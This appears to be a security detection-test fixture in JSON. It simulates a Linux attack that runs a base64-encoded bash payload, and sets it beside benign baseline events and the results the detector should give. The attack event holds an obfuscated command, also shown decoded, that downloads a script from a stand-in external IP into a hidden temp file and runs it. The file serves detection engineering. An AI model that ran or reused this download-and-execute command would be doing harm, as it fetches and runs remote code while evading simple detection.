@@ -1,0 +1,128 @@
+{
+  "technique_id": "T1059.004",
+  "technique_name": "Unix Shell — Base64 Encoded Payload Execution",
+  "description": "Simulates attacker using bash -c with a base64-encoded payload to download and execute a reverse shell, evading simple string-based detections.",
+  "platform": "linux",
+  "mitre_tactic": "execution",
+  "events": {
+    "attack_sequence": [
+      {
+        "@timestamp": "{{now}}",
+        "event": {
+          "category": "process",
+          "type": "start",
+          "kind": "event",
+          "module": "auditd",
+          "dataset": "auditd.log"
+        },
+        "agent": { "type": "auditbeat" },
+        "host": {
+          "name": "LNX-WEB-01",
+          "os": { "family": "linux", "platform": "ubuntu" }
+        },
+        "process": {
+          "name": "bash",
+          "executable": "/bin/bash",
+          "args": ["-c", "eval $(echo d2dldCBodHRwOi8vMjAzLjAuMTEzLjUwL3BheWxvYWQuc2ggLU8gL3RtcC8uc3ZjICYmIGJhc2ggL3RtcC8uc3Zj | base64 -d)"],
+          "command_line": "bash -c eval $(echo d2dldCBodHRwOi8vMjAzLjAuMTEzLjUwL3BheWxvYWQuc2ggLU8gL3RtcC8uc3ZjICYmIGJhc2ggL3RtcC8uc3Zj | base64 -d)",
+          "pid": 44512,
+          "parent": { "name": "sshd", "pid": 1234 }
+        },
+        "user": { "name": "www-data", "id": "33" },
+        "auditd": {
+          "log": { "record_type": "SYSCALL" },
+          "data": { "syscall": "execve" }
+        },
+        "_simulation": {
+          "type": "attack",
+          "technique": "T1059.004",
+          "platform": "linux",
+          "expected_match": true,
+          "sequence_order": 1,
+          "sequence_total": 1,
+          "description": "bash -c with base64 decode+eval chain — decodes to: wget http://203.0.113.50/payload.sh -O /tmp/.svc && bash /tmp/.svc"
+        }
+      }
+    ],
+    "benign_similar": [
+      {
+        "@timestamp": "{{now}}",
+        "event": {
+          "category": "process",
+          "type": "start",
+          "kind": "event",
+          "module": "auditd",
+          "dataset": "auditd.log"
+        },
+        "agent": { "type": "auditbeat" },
+        "host": {
+          "name": "LNX-DEV-01",
+          "os": { "family": "linux", "platform": "ubuntu" }
+        },
+        "process": {
+          "name": "bash",
+          "executable": "/bin/bash",
+          "args": ["/opt/deploy/scripts/deploy.sh", "--env", "prod"],
+          "command_line": "bash /opt/deploy/scripts/deploy.sh --env prod",
+          "pid": 55001,
+          "parent": { "name": "jenkins", "pid": 50000 }
+        },
+        "user": { "name": "deploy", "id": "1002" },
+        "auditd": {
+          "log": { "record_type": "SYSCALL" },
+          "data": { "syscall": "execve" }
+        },
+        "_simulation": {
+          "type": "baseline",
+          "technique": "T1059.004",
+          "platform": "linux",
+          "expected_match": false,
+          "description": "Jenkins CI deployment script — legitimate automation, no encoded payload"
+        }
+      },
+      {
+        "@timestamp": "{{now}}",
+        "event": {
+          "category": "process",
+          "type": "start",
+          "kind": "event",
+          "module": "auditd",
+          "dataset": "auditd.log"
+        },
+        "agent": { "type": "auditbeat" },
+        "host": {
+          "name": "LNX-DEV-01",
+          "os": { "family": "linux", "platform": "ubuntu" }
+        },
+        "process": {
+          "name": "bash",
+          "executable": "/bin/bash",
+          "args": ["-c", "echo aGVsbG8= | base64 -d"],
+          "command_line": "bash -c echo aGVsbG8= | base64 -d",
+          "pid": 55002,
+          "parent": { "name": "bash", "pid": 50001 }
+        },
+        "user": { "name": "jsmith", "id": "1001" },
+        "auditd": {
+          "log": { "record_type": "SYSCALL" },
+          "data": { "syscall": "execve" }
+        },
+        "_simulation": {
+          "type": "baseline",
+          "technique": "T1059.004",
+          "platform": "linux",
+          "expected_match": false,
+          "description": "Developer decoding a base64 string interactively — no eval or execution chain"
+        }
+      }
+    ]
+  },
+  "expected_detection": {
+    "should_alert_on": "attack_sequence",
+    "should_not_alert_on": "benign_similar",
+    "key_fields": ["process.name", "process.command_line", "process.args"],
+    "notes": "Detect bash -c with eval+base64 pattern. False positives possible from legitimate automation using base64 for config encoding — require eval or pipe-to-shell pattern to reduce FPs."
+  },
+  "log_sources_used": ["auditbeat"],
+  "platforms": ["linux"]
+}
